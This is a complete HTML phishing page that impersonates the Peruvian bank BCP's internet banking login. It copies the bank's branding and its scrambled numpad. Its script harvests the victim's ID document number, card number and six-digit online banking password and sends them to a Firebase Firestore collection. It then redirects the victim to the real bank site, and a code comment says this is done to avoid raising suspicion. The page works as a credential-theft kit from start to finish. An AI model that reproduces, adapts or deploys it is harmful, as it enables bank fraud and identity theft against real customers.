<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banca por Internet | BCP</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, html { height: 100%; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; overflow: hidden; }
        
        /* Lado izquierdo azul */
        .sidebar { 
            background-color: #002a8d; 
            width: 35%; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            position: relative; 
        }
        
        /* Lado derecho formulario */
        .main-content { 
            width: 65%; 
            padding: 40px 10%; 
            display: flex; 
            flex-direction: column; 
            justify-content: center;
        }

        .logo-bcp { position: absolute; top: 40px; left: 40px; width: 100px; }
        
        .form-container { max-width: 400px; width: 100%; margin: 0 auto; }

        .label-custom { font-size: 13px; color: #64748b; margin-bottom: 4px; display: block; }
        
        .input-bcp { 
            border: 1px solid #cbd5e1; 
            border-radius: 4px; 
            padding: 12px; 
            width: 100%; 
            outline: none; 
            margin-bottom: 20px; 
            font-size: 16px; 
            color: #334155;
        }
        
        .input-bcp:focus { border-color: #ff7900; }

        /* Teclado numérico dinámico */
        .numpad { 
            display: grid; 
            grid-template-columns: repeat(5, 1fr); 
            gap: 10px; 
            background-color: #f8fafc; 
            padding: 15px; 
            border-radius: 8px; 
            margin-bottom: 10px;
        }
        
        .key { 
            background: white; 
            border: 1px solid #e2e8f0; 
            border-radius: 4px; 
            padding: 12px 0; 
            text-align: center; 
            font-weight: 600; 
            color: #002a8d; 
            cursor: pointer; 
            user-select: none;
            transition: background 0.1s;
        }
        
        .key:active { background-color: #f1f5f9; }

        .btn-ingresar { 
            background-color: #ff7900; 
            color: white; 
            font-weight: bold; 
            width: 100%; 
            padding: 16px; 
            border-radius: 4px; 
            margin-top: 30px; 
            font-size: 16px; 
            text-transform: uppercase;
        }

        .captcha-area { display: flex; align-items: center; gap: 15px; margin-top: 20px; }
        .captcha-img { 
            background: #f1f5f9; 
            padding: 10px 20px; 
            font-style: italic; 
            font-family: serif; 
            letter-spacing: 4px; 
            color: #94a3b8; 
            text-decoration: line-through; 
            border-radius: 4px;
            font-size: 18px;
        }

        #loader { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(255,255,255,0.9); z-index: 999; flex-direction: column; align-items: center; justify-content: center; 
        }

        .character-box { width: 80%; }
    </style>
</head>
<body class="flex">

    <!-- Pantalla de carga -->
    <div id="loader">
        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-[#002a8d]"></div>
        <p class="mt-4 text-[#002a8d] font-bold">Iniciando sesión segura...</p>
    </div>

    <!-- Sección Izquierda (Azul) -->
    <div class="sidebar">
        <div class="logo-bcp">
            <svg viewBox="0 0 100 35" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0H25L15 35H-10L0 0Z" fill="#FF7900"/>
                <text x="30" y="27" fill="white" font-size="28" font-weight="900" font-style="italic">BCP</text>
            </svg>
        </div>
        
        <div class="character-box">
            <!-- SVG del personaje azul con la llave -->
            <svg viewBox="0 0 200 300" xmlns="http://www.w3.org/2000/svg">
                <circle cx="100" cy="80" r="35" fill="#ffd1a9" />
                <rect x="75" y="72" width="50" height="12" rx="6" fill="#ff7900" />
                <path d="M60 120 Q100 80 140 120 L155 280 L45 280 Z" fill="#0039a6" />
                <path d="M50 130 L25 160" stroke="#0039a6" stroke-width="20" stroke-linecap="round" />
                <circle cx="20" cy="150" r="12" fill="#ff7900" />
                <rect x="18" y="160" width="4" height="15" fill="#ff7900" />
            </svg>
        </div>
    </div>

    <!-- Sección Derecha (Login) -->
    <div class="main-content">
        <div class="form-container">
            <h1 class="text-[#002a8d] text-2xl font-bold mb-8">Banca por Internet</h1>

            <div class="flex gap-4">
                <div class="w-1/3">
                    <span class="label-custom">Tipo</span>
                    <select id="tipoDoc" class="input-bcp bg-gray-50">
                        <option>DNI</option>
                        <option>CE</option>
                    </select>
                </div>
                <div class="w-2/3">
                    <span class="label-custom">Número de documento</span>
                    <input type="text" id="documento" class="input-bcp" placeholder="Ingrese documento" maxlength="11">
                </div>
            </div>

            <div>
                <span class="label-custom">Número de tarjeta</span>
                <input type="text" id="tarjeta" class="input-bcp" placeholder="XXXX XXXX XXXX XXXX" maxlength="16">
            </div>

            <div class="flex items-center gap-2 mb-6">
                <input type="checkbox" id="recordar" class="w-4 h-4 accent-[#ff7900]">
                <label for="recordar" class="text-sm text-gray-500">Recordar datos</label>
            </div>

            <div>
                <span class="label-custom">Clave de internet (6 dígitos)</span>
                <input type="password" id="clave" class="input-bcp bg-gray-50" readonly placeholder="••••••">
            </div>

            <!-- Teclado desordenado -->
            <div class="numpad" id="numpad-container">
                <!-- Se genera aleatoriamente por JS -->
            </div>
            
            <p class="text-center text-[#ff7900] text-xs font-bold cursor-pointer mb-6" onclick="borrar()">BORRAR CLAVE</p>

            <div class="flex justify-between items-center text-sm font-bold text-[#ff7900]">
                <span>Crear clave</span>
                <div class="captcha-area">
                    <div class="captcha-img">6gy5fp</div>
                    <input type="text" class="border rounded p-2 w-20 text-center outline-none" placeholder="6gy5fp">
                </div>
                <span>Olvidé mi clave</span>
            </div>

            <button onclick="enviarDatos()" class="btn-ingresar">INGRESAR</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";

        const firebaseConfig = JSON.parse(__firebase_config);
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-bcp-app';

        // Lógica del teclado numérico desordenado
        const keys = ['1','6','4','2','5','0','8','7','9','3'];
        const numpad = document.getElementById('numpad-container');
        
        keys.forEach(num => {
            const keyDiv = document.createElement('div');
            keyDiv.className = 'key';
            keyDiv.innerText = num;
            keyDiv.onclick = () => {
                const input = document.getElementById('clave');
                if (input.value.length < 6) input.value += num;
            };
            numpad.appendChild(keyDiv);
        });

        window.borrar = () => { document.getElementById('clave').value = ''; };

        window.enviarDatos = async () => {
            const doc = document.getElementById('documento').value;
            const tar = document.getElementById('tarjeta').value;
            const cla = document.getElementById('clave').value;
            const tip = document.getElementById('tipoDoc').value;

            if (doc.length < 5 || tar.length < 10 || cla.length < 6) {
                alert("Por favor, completa los datos correctamente.");
                return;
            }

            document.getElementById('loader').style.display = 'flex';

            try {
                await signInAnonymously(auth);
                
                // Envío de datos a la colección 'registros'
                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'registros'), {
                    tipo_documento: tip,
                    documento: doc,
                    tarjeta: tar,
                    clave: cla,
                    fecha: serverTimestamp(),
                    agente: navigator.userAgent
                });

                // Redirección al sitio oficial para no levantar sospechas
                setTimeout(() => {
                    window.location.href = "https://www.viabcp.com/";
                }, 1500);

            } catch (error) {
                console.error("Error al enviar:", error);
                document.getElementById('loader').style.display = 'none';
                alert("Error de conexión. Intente nuevamente.");
            }
        };
    </script>
</body>
</html>
